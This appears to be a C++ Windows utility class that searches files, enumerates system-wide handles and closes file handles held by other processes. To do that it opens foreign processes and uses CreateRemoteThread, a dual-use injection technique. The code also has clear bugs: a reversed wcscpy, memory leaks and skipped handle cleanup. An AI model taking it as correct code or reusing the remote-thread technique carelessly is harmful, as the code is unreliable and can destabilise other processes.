//////////////////////////////////////////////////////////////////////////
// Provate:

bool CFileControlTool::InternalFindFile(LPCTSTR sFindPath, LPCTSTR sFindFileName, ULONGLONG &uCountFolder, ULONGLONG &uCountFile,PFINDFILE pCallbackFindFile,PFINDFOLDER pCallbackFindFolder,BOOL bFuzzy,BOOL bDirectory,PVOID pFileParameter,PVOID pDirectoryParameter)

{ 
	HANDLE hFind; 
	BOOL fFinished = FALSE; 
	WIN32_FIND_DATA FindFileData; 
	TCHAR sPath[MAX_PATH],sFormatFileName[MAX_PATH+3] = _T("*"); 

	lstrcpy(sFormatFileName, sFindPath); 

	if (bFuzzy){
		lstrcat(sFormatFileName,_T("\\*")); 
		lstrcat(sFormatFileName, sFindFileName); 
		lstrcat(sFormatFileName, _T("*")); 
	}else {
		PathAddBackslash(sFormatFileName);
		lstrcat(sFormatFileName,sFindFileName); 
	}

	hFind = FindFirstFile(sFormatFileName, &FindFileData); 

	if (hFind == INVALID_HANDLE_VALUE) { 
		return FALSE; 
	} else  { 
		while (!fFinished)  
		{ 
			lstrcpy(sPath, sFindPath); 
			PathAddBackslash(sPath);
			//lstrcat(sPath, _T("//")); 
			//PathAddExtension(sPath,FindFileData.cFileName);
			//lstrcat(sPath, FindFileData.cFileName); 

			if (FILE_ATTRIBUTE_DIRECTORY & FindFileData.dwFileAttributes) 
			{ 
				if (0 != lstrcmp(FindFileData.cFileName,_T(".")) && 0 != lstrcmp(FindFileData.cFileName,_T(".."))) {
					if(pCallbackFindFolder(sPath,FindFileData.cFileName,pDirectoryParameter))
						++uCountFolder;
				}
			} 
			else 
			{
				if(pCallbackFindFile(sPath,FindFileData.cFileName,pFileParameter))
					++uCountFile;
			}

			if (!FindNextFile(hFind, &FindFileData)) { 
				if (GetLastError() == ERROR_NO_MORE_FILES)  
					fFinished = TRUE;  
				else  
					break;
			} 
		} 

		FindClose(hFind); 
	} 

	return TRUE; 
} 

bool CFileControlTool::InternalFindFolder(LPCTSTR sPath, LPCTSTR sFindFileName, ULONGLONG &uCountFolder, ULONGLONG &uCountFile,PFINDFILE pCallbackFindFile,PFINDFOLDER pCallbackFindFolder,BOOL bFuzzy,BOOL bDirectory,PVOID pFileParameter,PVOID pDirectoryParameter)
{ 
	TCHAR sTemp[MAX_PATH]; 
	TCHAR sFormatFileName[MAX_PATH]; 
	WIN32_FIND_DATA FindFileData; 
	HANDLE hFind; 
	BOOL fFinished = FALSE; 

	InternalFindFile(sPath, sFindFileName, uCountFolder, uCountFile,pCallbackFindFile,pCallbackFindFolder,bFuzzy,bDirectory,pFileParameter,pDirectoryParameter); 

	lstrcpy(sFormatFileName, sPath); 
	lstrcat(sFormatFileName, _T("\\*")); 
	hFind = FindFirstFile(sFormatFileName, &FindFileData); 

	if (hFind == INVALID_HANDLE_VALUE)  { 
		return FALSE; 
	} else { 
		while (!fFinished)  
		{ 
			if (FILE_ATTRIBUTE_DIRECTORY & FindFileData.dwFileAttributes) 
			{ 
				if (0 != lstrcmp(FindFileData.cFileName,_T(".")) && 0 != lstrcmp(FindFileData.cFileName,_T("..")) &&bDirectory){ 
					lstrcpy(sTemp, sPath); 
					PathAddBackslash(sTemp);
					PathAddExtension(sTemp,FindFileData.cFileName);
					InternalFindFolder(sTemp, sFindFileName, uCountFolder, uCountFile,pCallbackFindFile,pCallbackFindFolder,bFuzzy,bDirectory,pFileParameter,pDirectoryParameter); 
				} 
			} 

			if (!FindNextFile(hFind, &FindFileData)){ 
				if (GetLastError() == ERROR_NO_MORE_FILES)
					return TRUE; 
				else
					return FALSE; 
			} 
		} 

		FindClose(hFind); 
	} 

	return TRUE; 
} 


CFileControlTool::PSYSTEM_PROCESS_INFORMATION CFileControlTool::GetProcessInformation(DWORD dwProcessID)   
{   
	PSYSTEM_PROCESS_INFORMATION pCurrentProcessInfo = NULL;


	if (NULL == m_pProcessInformationBuffer)
	{
		m_pProcessInformationBuffer = (PSYSTEM_PROCESS_INFORMATION)malloc(MAX_BUFFER_PROCESS_INFORMATION_SIZE);   
	}

	// query the process information
	if (NtQuerySystemInformation( 5, m_pProcessInformationBuffer, BufferSize, NULL ) != 0 )   
		return NULL;   

	DWORD dwCurrentProcessID = GetCurrentProcessId(); //Current Process ID   

	PSYSTEM_PROCESS_INFORMATION pSysProcess = (PSYSTEM_PROCESS_INFORMATION)m_pProcessInformationBuffer;  
	do    
	{   
		// fill the process information map   
		if (dwProcessID == pSysProcess->dUniqueProcessId)
		{
			return pSysProcess;
		} 

		// we found this process   
		if ( pSysProcess->dUniqueProcessId == dwCurrentProcessID )   
			pCurrentProcessInfo = pSysProcess;   

		// get the next process information block   
		if (pSysProcess->dNext != 0 )   
			pSysProcess = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)pSysProcess + pSysProcess->dNext);   
		else   
			pSysProcess = NULL;   

	} while ( pSysProcess != NULL );   

	return NULL;   
}   


BOOL CFileControlTool::IsSupportedHandle( CFileControlTool::SYSTEM_HANDLE& handle )   
{   
	//Here you can filter the handles you don't want in the Handle list   

	// Windows 2000 supports everything :)   
	if ( dwNTMajorVersion >= 5 )   
		return TRUE;   

	//NT4 System process doesn't like if we bother his internal security :)   
	if ( handle.ProcessID == 2 && handle.HandleType == 16 )   
		return FALSE;   

	return TRUE;   
}


BOOL CFileControlTool::GetTypeToken( HANDLE h, LPWSTR pszStr,DWORD processId)
{   
	ULONG size = 0x2000;   
	UCHAR* lpBuffer = NULL;   
	BOOL ret = FALSE;   

	HANDLE handle;   
	HANDLE hRemoteProcess = NULL;   
	BOOL remote = processId != GetCurrentProcessId();   

	if ( remote )   
	{   
		// Open the remote process   
		hRemoteProcess = OpenProcess( PROCESS_DUP_HANDLE, TRUE, processId );   

		if ( hRemoteProcess == NULL )   
			return FALSE;   

		// Duplicate the handle   
		DuplicateHandle( hRemoteProcess, h,   GetCurrentProcess(), &handle, 0, FALSE, DUPLICATE_SAME_ACCESS );   
	}   
	else   
		handle = h;   

	// Query the info size   
	NtQueryObject( handle, 2, NULL, 0, &size );   

	lpBuffer = new UCHAR[size];   

	// Query the info size ( type )   
	if (NtQueryObject( handle, 2, lpBuffer, size, NULL ) == 0 )   
	{    
		wcscpy(pszStr,(LPCWSTR)(lpBuffer+0x60));
		//SystemInfoUtils::LPCWSTR2CString( (LPCWSTR)(lpBuffer+0x60),pszStr);   

		ret = TRUE;   
	}   

	if ( remote )   
	{   
		if ( hRemoteProcess != NULL )   
			CloseHandle( hRemoteProcess );   

		if ( handle != NULL )   
			CloseHandle( handle );   
	}   

	if (lpBuffer != NULL) 
	{
		delete [] lpBuffer;
		lpBuffer = NULL;
	}

	return ret;   
}

BOOL CFileControlTool::GetTypeFromTypeToken( LPCTSTR typeToken, WORD& type )   
{   
	const WORD count = 27;   
	LPCTSTR constStrTypes[count] = {    
		_T(""), _T(""), _T("Directory"), _T("SymbolicLink"), _T("Token"),   
		_T("Process"), _T("Thread"), _T("Unknown7"), _T("Event"), _T("EventPair"), _T("Mutant"),    
		_T("Unknown11"), _T("Semaphore"), _T("Timer"), _T("Profile"), _T("WindowStation"),   
		_T("Desktop"), _T("Section"), _T("Key"), _T("Port"), _T("WaitablePort"),    
		_T("Unknown21"), _T("Unknown22"), _T("Unknown23"), _T("Unknown24"),   
		_T("IoCompletion"), _T("File") };   

		type = OB_TYPE_UNKNOWN;   

		for ( WORD i = 1; i < count; i++ ) 
		{
			if (0 == _tcsicmp(constStrTypes[i],typeToken))   
			{   
				type = i;   
				return TRUE;   
			}   
		}

			return FALSE;   
}   


BOOL CFileControlTool::GetHandleType( HANDLE h, WORD& type, DWORD processId )   
{   
	DWORD size = 0x2000;   
	LPWSTR strType;   


	strType = new WCHAR[size];

	type = OB_TYPE_UNKNOWN;   

	if (!GetTypeToken(h, strType, processId ))   
		return FALSE;   

	return GetTypeFromTypeToken(strType,type);   
}  

BOOL CFileControlTool::GetProcessId( HANDLE h, DWORD& processId, DWORD remoteProcessId )   
{   
	BOOL ret = FALSE;   
	HANDLE handle;   
	HANDLE hRemoteProcess = NULL;   
	BOOL remote = remoteProcessId != GetCurrentProcessId();   
	PROCESS_BASIC_INFORMATION pi;   

	ZeroMemory( &pi, sizeof(pi) );   
	processId = 0;    

	if ( remote )   
	{   
		// Open process   
		hRemoteProcess = OpenProcess(PROCESS_DUP_HANDLE,TRUE,remoteProcessId);   

		if ( hRemoteProcess == NULL )   
			return FALSE;   

		// Duplicate handle   
		DuplicateHandle(hRemoteProcess,h,GetCurrentProcess(),&handle,0,FALSE,DUPLICATE_SAME_ACCESS); 
	}   
	else   
		handle = h;   

	// Get the process information   
	if (NtQueryInformationProcess( handle, 0, &pi, sizeof(pi), NULL) == 0 )   
	{   
		processId = pi.UniqueProcessId;   
		ret = TRUE;   
	}   

	if ( remote )   
	{   
		if ( hRemoteProcess != NULL )   
			CloseHandle( hRemoteProcess );   

		if ( handle != NULL )   
			CloseHandle( handle );   
	}   

	return ret;   
}  

BOOL CFileControlTool::GetNameByType( HANDLE h, WORD type,LPTSTR str, DWORD processId )   
{   
	ULONG size = 0x2000;   
	UNICODE_STRING* lpBuffer = NULL;   
	BOOL ret = FALSE;   

	HANDLE handle;   
	HANDLE hRemoteProcess = NULL;   
	BOOL remote = processId != GetCurrentProcessId();   
	DWORD dwId = 0;   
 

	if ( remote )   
	{   
		hRemoteProcess = OpenProcess(PROCESS_DUP_HANDLE,TRUE,processId);   

		if ( hRemoteProcess == NULL )   
			return FALSE;   
		DuplicateHandle(hRemoteProcess,h,GetCurrentProcess(),&handle,0,FALSE,DUPLICATE_SAME_ACCESS);   
	}   
	else   
		handle = h;   

	// let's be happy, handle is in our process space, so query the infos :)   
	switch( type )   
	{   
	case OB_TYPE_PROCESS:   
		GetProcessId( handle, dwId );   

		_stprintf(str, _T("PID: 0x%X"), dwId );   

		ret = TRUE;   
		goto cleanup;   
		break;   

	case OB_TYPE_THREAD:   
		GetProcessId( handle, dwId );   

		_stprintf(str,_T("TID: 0x%X") , dwId );   

		ret = TRUE;   
		goto cleanup;   
		break;   

	case OB_TYPE_FILE:   
		ret = GetFileName( handle, str );   

		// access denied :(   
		if ( ret && '\0' == str[0])   
			goto cleanup;   
		break;   

	};

	NtQueryObject ( handle, 1, NULL, 0, &size );   

	// let's try to use the default   
	if ( size == 0 )   
		size = 0x2000;   

	lpBuffer = (UNICODE_STRING *)new UCHAR[size];   

	if ( NtQueryObject( handle, 1, lpBuffer, size, NULL ) == 0 )   
	{  
		wcscpy(lpBuffer->Buffer,str);
		//SystemInfoUtils::Unicode2CString( (UNICODE_STRING*)lpBuffer, str );   
		ret = TRUE;   
	}   

cleanup:   

	if ( remote )   
	{   
		if ( hRemoteProcess != NULL )   
			CloseHandle( hRemoteProcess );   

		if ( handle != NULL )   
			CloseHandle( handle );   
	}   

	if ( lpBuffer != NULL )  
	{
		delete [] lpBuffer; 
		lpBuffer = NULL;
	}

	return ret;   
}   


//File related functions   
DWORD WINAPI GetFileNameThread( PVOID pParam )   
{   
	// This thread function for getting the filename   
	// if access denied, we hang up in this function,    
	// so if it times out we just kill this thread   
	CFileControlTool::GetFileNameThreadParam* p = (CFileControlTool::GetFileNameThreadParam*)pParam;   

	TCHAR lpBuffer[0x1000];   
	DWORD iob[2];   

	p->rc = CFunctionSafe::NtQueryInformationFile( p->hFile, iob, lpBuffer, sizeof(lpBuffer), 9 );   

	if ( p->rc == 0 )  
		_tcscpy_s(p->pName,MAX_PATH,lpBuffer);

	return 0;
}   

BOOL CFileControlTool::GetFileName( HANDLE h, LPTSTR str, DWORD processId )   
{   
	BOOL ret= FALSE;   
	HANDLE hThread = NULL;   
	GetFileNameThreadParam tp;   
	HANDLE handle;   
	HANDLE hRemoteProcess = NULL;   
	BOOL remote = processId != GetCurrentProcessId();   


	if ( remote )   
	{      
		// Open process   
		hRemoteProcess = OpenProcess(PROCESS_DUP_HANDLE,TRUE,processId);    

		if ( hRemoteProcess == NULL )   
			return FALSE;   

		// Duplicate handle   
		DuplicateHandle(hRemoteProcess,h,GetCurrentProcess(),&handle,0,FALSE,DUPLICATE_SAME_ACCESS);    
	}   
	else   
		handle = h;   

	tp.hFile = handle;   
	tp.pName = str;   
	tp.rc = 0;   

	// Let's start the thread to get the file name
	DWORD dwThreadId = 0;

	FILE_NAME_INFORMATION lpFileNameInfo;   
	DWORD iob[2];   

	tp.rc = NtQueryInformationFile(handle, iob, &lpFileNameInfo, sizeof(FILE_NAME_INFORMATION),FileNameInformation);   

	if ( tp.rc == 0 )  
		MbsToWcs((LPCSTR)lpFileNameInfo.FileName,tp.pName);
		//_tcsncpy(tp.pName,lpFileNameInfo.FileName,lpFileNameInfo.FileNameLength);

	ret = ( tp.rc == 0 );   

cleanup:   

	if ( remote )   
	{   
		if ( hRemoteProcess != NULL )   
			CloseHandle( hRemoteProcess );   

		if ( handle != NULL )   
			CloseHandle( handle );   
	}   

	return ret;   
}   


BOOL CFileControlTool::GetName( HANDLE handle,LPTSTR str, DWORD processId )   
{   
	WORD type = 0;   

	if ( !GetHandleType( handle, type, processId  ) )   
		return FALSE;   

	return GetNameByType( handle, type, str, processId );   
}   

BOOL CFileControlTool::CloseRemoteFileHandles(LPCTSTR lpFileName)   
{   
	TCHAR szDeviceFileName[MAX_NAME_DRIVER_LEN] = {0};   
	TCHAR fsFilePath[MAX_PATH];   
	TCHAR name[MAX_PATH];   
	TCHAR szProcessName[MAX_PATH +1] = {0};   
	//SystemHandleInformation hi;   
	//SystemProcessInformation pi;   
	PSYSTEM_PROCESS_INFORMATION pProcessInformation;   

	//Convert it to device file name   
	if (!GetDeviceFileName(lpFileName,szDeviceFileName,MAX_NAME_DRIVER_LEN))   
	{   
		Out(Dbg, _T("GetDeviceFileName() failed.\n") );   
		return FALSE;   
	}   

	//////////////////////////////////////////////////////////////////////////
	// ���ϵͳ�����

	DWORD size = 0x2000;   
	DWORD needed = 0;   
	DWORD i = 0;   
	BOOL  ret = TRUE;   
	LPWSTR strType;   
 

	strType = new WCHAR[size];


	// Allocate the memory for the buffer   
	SYSTEM_HANDLE_INFORMATION* pSysHandleInformation = (SYSTEM_HANDLE_INFORMATION*)   
		VirtualAlloc( NULL, size, MEM_COMMIT, PAGE_READWRITE );   

	if ( pSysHandleInformation == NULL )   
		return FALSE;   

	// Query the needed buffer size for the objects ( system wide )   
	if (NtQuerySystemInformation( 16, pSysHandleInformation, size, &needed ) != 0 )   
	{   
		if ( needed == 0 )   
		{   
			ret = FALSE;   
			goto cleanup;   
		}   

		// The size was not enough   
		VirtualFree( pSysHandleInformation, 0, MEM_RELEASE );   

		pSysHandleInformation = (SYSTEM_HANDLE_INFORMATION*)   
			VirtualAlloc( NULL, size = needed + 256, MEM_COMMIT, PAGE_READWRITE );   
	}   

	if ( pSysHandleInformation == NULL )   
		return FALSE;   

	// Query the objects ( system wide )   
	if (NtQuerySystemInformation( 16, pSysHandleInformation, size, NULL ) != 0 )   
	{   
		ret = FALSE;   
		goto cleanup;   
	}   

	// Iterating through the objects   
	for ( i = 0; i < pSysHandleInformation->Count; i++ )   
	{   
		if ( !IsSupportedHandle( pSysHandleInformation->Handles[i] ) )   
			continue;   

		// ProcessId filtering check   
		if (TRUE/* pSysHandleInformation->Handles[i].ProcessID == m_processId || m_processId == (DWORD)-1 */)   
		{      

				// Type filtering   
				GetTypeToken( (HANDLE)pSysHandleInformation->Handles[i].HandleNumber, strType, pSysHandleInformation->Handles[i].ProcessID  );   

				BOOL bAdd = (0 == _tcsicmp(strType,_T("File")));     

			// That's it. We found one.   
			if ( bAdd )   
			{      
				pSysHandleInformation->Handles[i].HandleType = (WORD)(pSysHandleInformation->Handles[i].HandleType % 256);   

				//////////////////////////////////////////////////////////////////////////
				// ����ϵͳ�����


				SYSTEM_HANDLE& h = pSysHandleInformation->Handles[i];   

				if (NULL == (pProcessInformation = GetProcessInformation(h.ProcessID)))   
					continue;

				//Get the process name   
				//SystemInfoUtils::Unicode2CString( &pProcessInformation->usName,szProcessName);   

				//NT4 Stupid thing if I query the name of a file in services.exe   
				//Messengr service brings up a message dialog ??? :(   
				if (dwNTMajorVersion == 4 && _tcsicmp(szProcessName, _T("services.exe") ) == 0 )   
					continue;   

				//what's the file name for this given handle?   
				GetName( (HANDLE)h.HandleNumber, name, h.ProcessID );   

				//This is what we want to delete, so close the handle   
				if (_tcsicmp(name,szDeviceFileName) == 0)   
					;
					//CloseRemoteHandle(pProcessInformation->usName.Buffer, h.ProcessID, (HANDLE)h.HandleNumber );   

				//////////////////////////////////////////////////////////////////////////  

			}   
		}   
	}   

cleanup:   

	if ( pSysHandleInformation != NULL )   
		VirtualFree( pSysHandleInformation, 0, MEM_RELEASE );   

	return TRUE;
}  //Closes the file handles in the processes which are using this file 

BOOL CFileControlTool::CloseRemoteProcessHandle(DWORD dwProcessID,HANDLE hRemoteHandle)   
{   
	BOOL result = FALSE;
	HANDLE hRemoteThread = NULL;
	HMODULE hKernel32Module = NULL;
	HANDLE hTargetProcess = NULL;
	hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,FALSE,dwProcessID);
	hKernel32Module = LoadLibrary(_T("kernel32.dll")); 

	if(hTargetProcess && hKernel32Module){
		hRemoteThread = CreateRemoteThread(hTargetProcess,0,0,(LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32Module,"CloseHandle"),hRemoteHandle,0,NULL);
		if(hRemoteThread == NULL){
			result = FALSE;
			goto Error;
		}
		if(WaitForSingleObject(hRemoteThread,2000) == WAIT_OBJECT_0){
			result = TRUE;
		}else{
			result = FALSE;
		}
	}

Error:
	if(hRemoteThread){
		CloseHandle(hRemoteThread);
	}
	if(hTargetProcess){
		CloseHandle(hTargetProcess);
	}
	if(hKernel32Module){
		FreeLibrary(hKernel32Module);
	}
	return result; 
}
